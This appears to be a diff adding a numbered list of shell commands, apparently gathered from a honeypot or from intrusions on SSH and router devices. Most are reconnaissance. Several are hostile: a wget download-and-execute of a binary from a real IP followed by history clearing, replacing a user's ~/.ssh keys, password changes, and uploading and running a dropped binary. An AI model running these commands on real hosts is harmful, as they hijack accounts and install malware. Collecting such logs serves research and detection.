@@ -1,0 +1,37 @@
+echo ""|passwd -|::|- 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}' -|::|- 2
+cat /proc/cpuinfo | grep name | wc -l -|::|- 3
+cd ~ && rm -rf .ssh && mkdir .ssh && echo "">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ -|::|- 4
+which ls -|::|- 5
+echo -e ""|passwd|bash -|::|- 6
+ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/* -|::|- 7
+lscpu | grep Model -|::|- 8
+lspci -|::|- 9
+/ip cloud print -|::|- 10
+top -|::|- 11
+Enter new UNIX password:  -|::|- 12
+crontab -l -|::|- 13
+ip r -|::|- 14
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}' -|::|- 15
+cat /proc/cpuinfo | grep model | grep name | wc -l -|::|- 16
+ip n -|::|- 17
+ps | grep '[Mm]iner' -|::|- 18
+lscpu -|::|- 19
+./q80t6JBH -|::|- 20
+cat /etc/issue; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://179.43.176.41/cometome; cat cometome > meth; chmod +x meth; chmod 777 *; ./meth rooted; history -c -|::|- 21
+uname -m -|::|- 22
+nproc;uname -a -|::|- 23
+cd /tmp && chmod +x q80t6JBH && bash -c ./q80t6JBH -|::|- 24
+uname -|::|- 25
+cat /proc/cpuinfo -|::|- 26
+/system scheduler add name="U6" interval=10m on-event="" policy=api,ftp,local,password,policy,read,reboot,sensitive,sniff,ssh,telnet,test,web,winbox,write -|::|- 27
+ps -ef | grep '[Mm]iner' -|::|- 28
+scp -t /tmp/q80t6JBH -|::|- 29
+w -|::|- 30
+halt -|::|- 31
+ls -|::|- 32
+echo ""|chpasswd|bash -|::|- 33
+ifconfig -|::|- 34
+echo Hi | cat -n -|::|- 35
+ls -lh $(which ls) -|::|- 36
+uname -a -|::|- 37
